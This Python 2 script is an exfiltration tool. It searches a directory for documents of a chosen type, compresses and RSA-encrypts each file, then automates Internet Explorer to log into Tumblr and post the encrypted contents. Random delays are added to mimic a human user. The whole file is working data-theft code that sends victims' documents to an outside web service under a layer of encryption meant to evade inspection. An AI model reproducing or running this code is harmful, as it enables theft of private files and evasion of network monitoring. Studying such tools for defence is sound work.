import win32com.client
import os
import fnmatch
import time
import random
import zlib
import sys

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doctype = sys.argv[1]
user = sys.argv[2]
credential = sys.argv[3]

public_key = """-----BEGIN PUBLIC KEY-----
LEFT ALIGNED 2048 BIT PUBLIC KEY
-----END PUBLIC KEY-----
"""

def browser_Wait(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

def encrypt_Function(plaintext):
    chunk_size = 128
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    print "Encrypting %d bytes" % len(plaintext)
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = ""
    offset = 0
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
    encrypted = encrypted.encode("base64")
    return encrypted

def encrypted_Posting(filename):
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()
    encrypted_title = encrypt_Function(filename)
    encrypted_body = encrypt_Function(contents)
    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(5, 10))
    return

def socmed_Login(ie):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", user)
        elif i.id == "signup_credential":
            i.setAttribute("value", credential)

    random_sleep()
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError as e:
        pass
    random_sleep()
    browser_Wait(ie)

def social_Transposition(ie, title, post):
    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()
    random_sleep()
    title_box.focus()
    random_sleep()
    post_form.children[0].click()
    browser_Wait(ie)
    random_sleep()

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1
    ie.Navigate("http://www.tumblr.com/login")
    browser_Wait(ie)
    socmed_Login(ie)
    browser_Wait(ie)
    title, body = encrypted_Posting(document_path)
    print "Creating new post..."
    social_Transposition(ie, title, body)
    print "Posted!"
    ie.Quit()
    ie = None

for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doctype):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")
